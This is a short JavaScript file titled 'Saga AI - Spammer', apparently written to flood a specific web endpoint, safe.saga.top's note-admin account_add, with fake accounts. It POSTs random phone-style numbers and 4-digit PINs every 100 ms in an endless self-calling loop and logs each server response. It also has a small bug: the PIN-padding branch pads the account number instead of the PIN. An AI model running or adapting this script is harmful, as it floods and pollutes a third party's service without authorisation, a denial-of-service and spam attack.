//Saga AI - Spammer
var attackCount = 0;
function attack(){
    attackCount += 1;
    var randomNumber = "09" + Math.floor(Math.random() * 1000000000)
    if(randomNumber.length != 11){
        randomNumber += "0"
    }
    var randomPin = "" + Math.floor(Math.random() * 10000)
    if(randomPin.length != 4){
        randomNumber += "0"
    }
    var targetURL = "http://safe.saga.top/note-admin/note/account_add"
    var http = new XMLHttpRequest();
    var url = targetURL;
    var params = '{"equipmentNum":null,"account":"'+randomNumber+'","password":"'+randomPin+'"}'
    http.open('POST', url, true);
    
    //Send the proper header information along with the request
    http.setRequestHeader('Content-type', 'application/json');
    
    http.onreadystatechange = function() {//Call a function when the state changes.
        if(http.readyState == 4 && http.status == 200) {
            var content = "error"
            try{
               content = JSON.parse(http.responseText).msg
            }catch(e){}
            console.log("Account: " + randomNumber + " Pin: " + randomPin + " Spam Count: " + attackCount + " Status: " + content);
            setTimeout(function(){
                attack()
            },100)
        }
    }
    http.send(params); 
}
attack()
